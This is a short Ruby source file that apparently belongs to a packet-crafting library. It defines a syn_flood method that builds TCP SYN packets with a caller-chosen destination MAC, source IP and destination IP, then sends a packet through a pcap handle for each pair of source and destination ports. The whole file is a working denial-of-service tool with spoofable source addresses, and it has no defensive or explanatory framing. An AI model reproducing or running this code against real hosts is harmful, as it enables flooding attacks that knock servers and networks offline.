require_relative '../../protocol/tcp_pac.rb'
class TCPP
	def self.syn_flood(pcap, options)

		dst_mac = options[:DST_MAC] || ""
		src_ip = options[:SRC_IP] || ""
		dst_ip = options[:DST_IP] || ""
		src_ports = options[:SRC_PORTS] || (0..0)
		dst_ports = options[:DST_PORTS] || (0..0)

		syn_pac = TCPP.syn_pac{ |sp|
			sp.etherh.dst_mac = dst_mac
			sp.ipv4h.src_addr = src_ip
			sp.ipv4h.dst_addr = dst_ip
		}

		# 如果是src_ports、 dst_ports是整数，先转成Range类型
		src_ports = src_ports.class <= Integer ? src_ports..src_ports : src_ports;
		dst_ports = dst_ports.class <= Integer ? dst_ports..dst_ports : dst_ports;

		dst_ports.each do |dst_port|
			syn_pac = TCPP.pac_from_pac(syn_pac) do |pac|
				pac.tcph.dst_port = dst_port
			end
			
			src_ports.each do |src_port|
				syn_pac.tcph.src_port = src_port
				# p syn_pac.pac_info_by_layer
				pcap.send_packet(syn_pac)
			end
		end
	end
end